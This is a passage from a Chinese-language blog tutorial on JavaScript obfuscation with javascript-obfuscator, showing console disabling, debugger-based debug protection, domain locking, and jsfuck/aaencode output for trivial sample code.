class="string">"0x7"</span>)] = _0x7ab6e4;</span><br><span class="line">      _0x5a8d9e[_0x5bff(<span class="string">"0x8"</span>)] = _0x7ab6e4;</span><br><span class="line">      _0x5a8d9e[_0x5bff(<span class="string">"0x9"</span>)] = _0x7ab6e4;</span><br><span class="line">      <span class="keyword">return</span> _0x5a8d9e;</span><br><span class="line">    &#125;)(_0x7ab6e4);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    _0x157bff[_0x5bff(<span class="string">"0x2"</span>)][_0x5bff(<span class="string">"0x3"</span>)] = _0x7ab6e4;</span><br><span class="line">    _0x157bff[_0x5bff(<span class="string">"0x2"</span>)][_0x5bff(<span class="string">"0x4"</span>)] = _0x7ab6e4;</span><br><span class="line">    _0x157bff[_0x5bff(<span class="string">"0x2"</span>)][<span class="string">"debug"</span>] = _0x7ab6e4;</span><br><span class="line">    _0x157bff[_0x5bff(<span class="string">"0x2"</span>)][_0x5bff(<span class="string">"0x6"</span>)] = _0x7ab6e4;</span><br><span class="line">    _0x157bff[_0x5bff(<span class="string">"0x2"</span>)][_0x5bff(<span class="string">"0x7"</span>)] = _0x7ab6e4;</span><br><span class="line">    _0x157bff[_0x5bff(<span class="string">"0x2"</span>)][_0x5bff(<span class="string">"0x8"</span>)] = _0x7ab6e4;</span><br><span class="line">    _0x157bff[_0x5bff(<span class="string">"0x2"</span>)][_0x5bff(<span class="string">"0x9"</span>)] = _0x7ab6e4;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">_0x19f538();</span><br><span class="line"><span class="built_in">console</span>[_0x5bff(<span class="string">"0x3"</span>)](_0x5bff(<span class="string">"0xa"</span>));</span><br></pre>      </td>    </tr>  </table></figure><p>此时，我们如果执行这个代码，发现是没有任何输出的，这里实际上就是将 console 的一些功能禁用了。</p><h3 id="调试保护"><a href="#调试保护" class="headerlink" title="调试保护"></a>调试保护</h3><p>我们知道，在 JavaScript 代码中如果加入 debugger 这个关键字，那么在执行到该位置的时候控制它就会进入断点调试模式。如果在代码多个位置都加入 debugger 这个关键字，或者定义某个逻辑来反复执行 debugger，那就会不断进入断点调试模式，原本的代码无法就无法顺畅地执行了。这个过程可以称为调试保护，即通过反复执行 debugger 来使得原来的代码无法顺畅执行。</p><p>其效果类似于执行了如下代码：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">setInterval(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">debugger</span>;</span><br><span class="line">&#125;, <span class="number">3000</span>);</span><br></pre>      </td>    </tr>  </table></figure><p>如果我们把这段代码粘贴到控制台，它就会反复地执行 debugger 语句进入断点调试模式，从而干扰正常的调试流程。</p><p>在 javascript-obfuscator 中可以使用 debugProtection 来启用调试保护机制，还可以使用 debugProtectionInterval 来启用无限 Debug ，使得代码在调试过程中会不断进入断点模式，无法顺畅执行，配置如下：</p><figure class="highlight yaml">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="string">const</span> <span class="string">options</span> <span class="string">=</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="attr">debugProtection:</span> <span class="literal">true</span><span class="string">,</span></span><br><span class="line">  <span class="attr">debugProtectionInterval:</span> <span class="literal">true</span><span class="string">,</span></span><br><span class="line"><span class="string">&#125;;</span></span><br></pre>      </td>    </tr>  </table></figure><p>混淆后的代码会不断跳到 debugger 代码的位置，使得整个代码无法顺畅执行，对 JavaScript 代码的调试形成一定的干扰。</p><h3 id="域名锁定"><a href="#域名锁定" class="headerlink" title="域名锁定"></a>域名锁定</h3><p>我们还可以通过控制 domainLock 来控制 JavaScript 代码只能在特定域名下运行，这样就可以降低代码被模拟或盗用的风险。</p><p>示例如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">console.log('hello world')</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  domainLock: [<span class="string">"cuiqingcai.com"</span>],</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们使用了 domainLock 指定了一个域名叫做 cuiqingcai.com，也就是设置了一个域名白名单，混淆后的代码结果如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">var</span> _0x3203 = [</span><br><span class="line">  <span class="string">"apply"</span>,</span><br><span class="line">  <span class="string">"return\x20(function()\x20"</span>,</span><br><span class="line">  <span class="string">"&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)"</span>,</span><br><span class="line">  <span class="string">"item"</span>,</span><br><span class="line">  <span class="string">"attribute"</span>,</span><br><span class="line">  <span class="string">"value"</span>,</span><br><span class="line">  <span class="string">"replace"</span>,</span><br><span class="line">  <span class="string">"length"</span>,</span><br><span class="line">  <span class="string">"charCodeAt"</span>,</span><br><span class="line">  <span class="string">"log"</span>,</span><br><span class="line">  <span class="string">"hello\x20world"</span>,</span><br><span class="line">];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x2ed22c, _0x3ad370</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x49dc54 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x53a786</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x53a786) &#123;</span><br><span class="line">      _0x2ed22c[<span class="string">"push"</span>](_0x2ed22c[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x49dc54(++_0x3ad370);</span><br><span class="line">&#125;)(_0x3203, <span class="number">0x155</span>);</span><br><span class="line"><span class="keyword">var</span> _0x5b38 = <span class="function"><span class="keyword">function</span> (<span class="params">_0xd7780b, _0x19c0f2</span>) </span>&#123;</span><br><span class="line">  _0xd7780b = _0xd7780b - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x2d2f44 = _0x3203[_0xd7780b];</span><br><span class="line">  <span class="keyword">return</span> _0x2d2f44;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> _0x485919 = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x5cf798 = !![];</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">_0xd1fa29, _0x2ed646</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x56abf = _0x5cf798</span><br><span class="line">      ? <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (_0x2ed646) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x33af63 = _0x2ed646[_0x5b38(<span class="string">"0x0"</span>)](_0xd1fa29, <span class="built_in">arguments</span>);</span><br><span class="line">            _0x2ed646 = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">return</span> _0x33af63;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      : <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">    _0x5cf798 = ![];</span><br><span class="line">    <span class="keyword">return</span> _0x56abf;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="keyword">var</span> _0x67dcc8 = _0x485919(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x276a31;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5c8be2 = <span class="built_in">Function</span>(_0x5b38(<span class="string">"0x1"</span>) + _0x5b38(<span class="string">"0x2"</span>) + <span class="string">");"</span>);</span><br><span class="line">    _0x276a31 = _0x5c8be2();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (_0x5f1c00) &#123;</span><br><span class="line">    _0x276a31 = <span class="built_in">window</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> _0x254a0d = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      key: _0x5b38(<span class="string">"0x3"</span>),</span><br><span class="line">      value: _0x5b38(<span class="string">"0x4"</span>),</span><br><span class="line">      getAttribute: (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> _0x5cc3c7 = <span class="number">0x0</span>; _0x5cc3c7 &lt; <span class="number">0x3e8</span>; _0x5cc3c7--) &#123;</span><br><span class="line">          <span class="keyword">var</span> _0x35b30b = _0x5cc3c7 &gt; <span class="number">0x0</span>;</span><br><span class="line">          <span class="keyword">switch</span> (_0x35b30b) &#123;</span><br><span class="line">            <span class="keyword">case</span> !![]:</span><br><span class="line">              <span class="keyword">return</span> (</span><br><span class="line">                <span class="keyword">this</span>[_0x5b38(<span class="string">"0x3"</span>)] +</span><br><span class="line">                <span class="string">"_"</span> +</span><br><span class="line">                <span class="keyword">this</span>[_0x5b38(<span class="string">"0x5"</span>)] +</span><br><span class="line">                <span class="string">"_"</span> +</span><br><span class="line">                _0x5cc3c7</span><br><span class="line">              );</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">this</span>[_0x5b38(<span class="string">"0x3"</span>)] + <span class="string">"_"</span> + <span class="keyword">this</span>[_0x5b38(<span class="string">"0x5"</span>)];</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)(),</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> _0x3b375a = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"[QLCIKYkCFzdWpzRAXMhxJOYpTpYWJHPll]"</span>, <span class="string">"g"</span>);</span><br><span class="line">  <span class="keyword">var</span> _0x5a94d2 = <span class="string">"cuQLiqiCInKYkgCFzdWcpzRAaXMi.hcoxmJOYpTpYWJHPll"</span></span><br><span class="line">    [_0x5b38(<span class="string">"0x6"</span>)](_0x3b375a, <span class="string">""</span>)</span><br><span class="line">    [<span class="string">"split"</span>](<span class="string">";"</span>);</span><br><span class="line">  <span class="keyword">var</span> _0x5c0da2;</span><br><span class="line">  <span class="keyword">var</span> _0x19ad5d;</span><br><span class="line">  <span class="keyword">var</span> _0x5992ca;</span><br><span class="line">  <span class="keyword">var</span> _0x40bd39;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x5cad1 <span class="keyword">in</span> _0x276a31) &#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      _0x5cad1[_0x5b38(<span class="string">"0x7"</span>)] == <span class="number">0x8</span> &amp;&amp;</span><br><span class="line">      _0x5cad1[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x7</span>) == <span class="number">0x74</span> &amp;&amp;</span><br><span class="line">      _0x5cad1[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x5</span>) == <span class="number">0x65</span> &amp;&amp;</span><br><span class="line">      _0x5cad1[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x3</span>) == <span class="number">0x75</span> &amp;&amp;</span><br><span class="line">      _0x5cad1[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x0</span>) == <span class="number">0x64</span></span><br><span class="line">    ) &#123;</span><br><span class="line">      _0x5c0da2 = _0x5cad1;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x29551 <span class="keyword">in</span> _0x276a31[_0x5c0da2]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      _0x29551[_0x5b38(<span class="string">"0x7"</span>)] == <span class="number">0x6</span> &amp;&amp;</span><br><span class="line">      _0x29551[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x5</span>) == <span class="number">0x6e</span> &amp;&amp;</span><br><span class="line">      _0x29551[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x0</span>) == <span class="number">0x64</span></span><br><span class="line">    ) &#123;</span><br><span class="line">      _0x19ad5d = _0x29551;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">"~"</span> &gt; _0x19ad5d)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> _0x2b71bd <span class="keyword">in</span> _0x276a31[_0x5c0da2]) &#123;</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        _0x2b71bd[_0x5b38(<span class="string">"0x7"</span>)] == <span class="number">0x8</span> &amp;&amp;</span><br><span class="line">        _0x2b71bd[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x7</span>) == <span class="number">0x6e</span> &amp;&amp;</span><br><span class="line">        _0x2b71bd[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x0</span>) == <span class="number">0x6c</span></span><br><span class="line">      ) &#123;</span><br><span class="line">        _0x5992ca = _0x2b71bd;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> _0x397f55 <span class="keyword">in</span> _0x276a31[_0x5c0da2][_0x5992ca]) &#123;</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        _0x397f55[<span class="string">"length"</span>] == <span class="number">0x8</span> &amp;&amp;</span><br><span class="line">        _0x397f55[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x7</span>) == <span class="number">0x65</span> &amp;&amp;</span><br><span class="line">        _0x397f55[_0x5b38(<span class="string">"0x8"</span>)](<span class="number">0x0</span>) == <span class="number">0x68</span></span><br><span class="line">      ) &#123;</span><br><span class="line">        _0x40bd39 = _0x397f55;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!_0x5c0da2 || !_0x276a31[_0x5c0da2]) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> _0x5f19be = _0x276a31[_0x5c0da2][_0x19ad5d];</span><br><span class="line">  <span class="keyword">var</span> _0x674f76 =</span><br><span class="line">    !!_0x276a31[_0x5c0da2][_0x5992ca] &amp;&amp;</span><br><span class="line">    _0x276a31[_0x5c0da2][_0x5992ca][_0x40bd39];</span><br><span class="line">  <span class="keyword">var</span> _0x5e1b34 = _0x5f19be || _0x674f76;</span><br><span class="line">  <span class="keyword">if</span> (!_0x5e1b34) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> _0x593394 = ![];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x479239 = <span class="number">0x0</span>; _0x479239 &lt; _0x5a94d2[<span class="string">"length"</span>]; _0x479239++) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x19ad5d = _0x5a94d2[_0x479239];</span><br><span class="line">    <span class="keyword">var</span> _0x112c24 = _0x5e1b34[<span class="string">"length"</span>] - _0x19ad5d[<span class="string">"length"</span>];</span><br><span class="line">    <span class="keyword">var</span> _0x51731c = _0x5e1b34[<span class="string">"indexOf"</span>](_0x19ad5d, _0x112c24);</span><br><span class="line">    <span class="keyword">var</span> _0x173191 = _0x51731c !== <span class="number">-0x1</span> &amp;&amp; _0x51731c === _0x112c24;</span><br><span class="line">    <span class="keyword">if</span> (_0x173191) &#123;</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        _0x5e1b34[<span class="string">"length"</span>] == _0x19ad5d[_0x5b38(<span class="string">"0x7"</span>)] ||</span><br><span class="line">        _0x19ad5d[<span class="string">"indexOf"</span>](<span class="string">"."</span>) === <span class="number">0x0</span></span><br><span class="line">      ) &#123;</span><br><span class="line">        _0x593394 = !![];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!_0x593394) &#123;</span><br><span class="line">    data;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  _0x254a0d();</span><br><span class="line">&#125;);</span><br><span class="line">_0x67dcc8();</span><br><span class="line"><span class="built_in">console</span>[_0x5b38(<span class="string">"0x9"</span>)](_0x5b38(<span class="string">"0xa"</span>));</span><br></pre>      </td>    </tr>  </table></figure><p>这段代码就只能在指定域名 cuiqingcai.com 下运行，不能在其他网站运行。这样的话，如果一些相关 JavaScript 代码被单独剥离出来，想在其他网站运行或者使用程序模拟运行的话，运行结果只有是失败，这样就可以有效降低被代码被模拟或盗用的风险。</p><h3 id="特殊编码"><a href="#特殊编码" class="headerlink" title="特殊编码"></a>特殊编码</h3><p>另外还有一些特殊的工具包，如使用 aaencode、jjencode、jsfuck 等工具对代码进行混淆和编码。</p><p>示例如下：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="selector-tag">var</span> <span class="selector-tag">a</span> = <span class="number">1</span></span><br></pre>      </td>    </tr>  </table></figure><p>jsfuck 的结果：</p><figure class="highlight markdown">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">[<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">+!![</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!![</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]][<span class="string">([</span>]+&#123;&#125;)[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">+!![</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!![</span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!![</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">+!![</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!![</span>]]]([<span class="string"></span>][<span class="symbol">(![</span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">+!![</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!![</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]][<span class="string">([</span>]+&#123;&#125;)[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">+!![</span>]]+([][[]]+[])[+!![]]+</span><br><span class="line">...</span><br><span class="line">([<span class="string"></span>]+&#123;&#125;)[<span class="string">+!![</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!![</span>]]]((!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!![</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+[</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+!![</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!![</span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+(![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">!+[</span>]+!![<span class="string"></span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">+!![</span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+(+&#123;&#125;+[<span class="string"></span>])[<span class="string">+!![</span>]]+(!![<span class="string"></span>]+[<span class="string"></span>])[<span class="string">+[</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+([<span class="string"></span>]+&#123;&#125;)[<span class="string">+!![</span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">+!![</span>]])(!+[<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]))[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]]+([<span class="string"></span>][<span class="symbol">[</span>]]+[<span class="string"></span>])[<span class="string">!+[</span>]+!![<span class="string"></span>]+!![<span class="string"></span>]])(!+[<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>])(([<span class="string"></span>]+&#123;&#125;)[<span class="string">+[</span>]])[<span class="string">+[</span>]]+(!+[<span class="string"></span>]+!![<span class="string"></span>]+!![<span class="string"></span>]+[<span class="string"></span>])+([][[]]+[])[!+[]+!![]])+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(+!![]+[]))(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])</span><br></pre>      </td>    </tr>  </table></figure><p>aaencode 的结果：</p><figure class="highlight gcode">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   / [<span class="string">'_'</span>]; o=<span class="comment">(ﾟｰﾟ)</span>  =_=<span class="number">3</span>; c=<span class="comment">(ﾟΘﾟ)</span> =<span class="comment">(ﾟｰﾟ)</span>-<span class="comment">(ﾟｰﾟ)</span>; <span class="comment">(ﾟДﾟ)</span> =<span class="comment">(ﾟΘﾟ)</span>= <span class="comment">(o^_^o)</span>/ <span class="comment">(o^_^o)</span>;<span class="comment">(ﾟДﾟ)</span>=&#123;ﾟΘﾟ: <span class="string">'_'</span> ,ﾟωﾟﾉ : <span class="comment">((ﾟωﾟﾉ==3)</span> +<span class="string">'_'</span>) [ﾟΘﾟ] ,ﾟｰﾟﾉ :<span class="comment">(ﾟωﾟﾉ+ '_')</span>[o^_^o -<span class="comment">(ﾟΘﾟ)</span>] ,ﾟДﾟﾉ:<span class="comment">((ﾟｰﾟ==3)</span> +<span class="string">'_'</span>)[ﾟｰﾟ] &#125;; <span class="comment">(ﾟДﾟ)</span> [ﾟΘﾟ] =<span class="comment">((ﾟωﾟﾉ==3)</span> +<span class="string">'_'</span>) [c^_^o];<span class="comment">(ﾟДﾟ)</span> [<span class="string">'c'</span>] = <span class="comment">((ﾟДﾟ)</span>+<span class="string">'_'</span>) [ <span class="comment">(ﾟｰﾟ)</span>+<span class="comment">(ﾟｰﾟ)</span>-<span class="comment">(ﾟΘﾟ)</span> ];<span class="comment">(ﾟДﾟ)</span> [<span class="string">'o'</span>] = <span class="comment">((ﾟДﾟ)</span>+<span class="string">'_'</span>) [ﾟΘﾟ];<span class="comment">(ﾟoﾟ)</span>=<span class="comment">(ﾟДﾟ)</span> [<span class="string">'c'</span>]+<span class="comment">(ﾟДﾟ)</span> [<span class="string">'o'</span>]+<span class="comment">(ﾟωﾟﾉ +'_')</span>[ﾟΘﾟ]+ <span class="comment">((ﾟωﾟﾉ==3)</span> +<span class="string">'_'</span>) [ﾟｰﾟ] + <span class="comment">((ﾟДﾟ)</span> +<span class="string">'_'</span>) [<span class="comment">(ﾟｰﾟ)</span>+<span class="comment">(ﾟｰﾟ)</span>]+ <span class="comment">((ﾟｰﾟ==3)</span> +<span class="string">'_'</span>) [ﾟΘﾟ]+<span class="comment">((ﾟｰﾟ==3)</span> +<span class="string">'_'</span>) [<span class="comment">(ﾟｰﾟ)</span> - <span class="comment">(ﾟΘﾟ)</span>]+<span class="comment">(ﾟДﾟ)</span> [<span class="string">'c'</span>]+<span class="comment">((ﾟДﾟ)</span>+<span class="string">'_'</span>) [<span class="comment">(ﾟｰﾟ)</span>+<span class="comment">(ﾟｰﾟ)</span>]+ <span class="comment">(ﾟДﾟ)</span> [<span class="string">'o'</span>]+<span 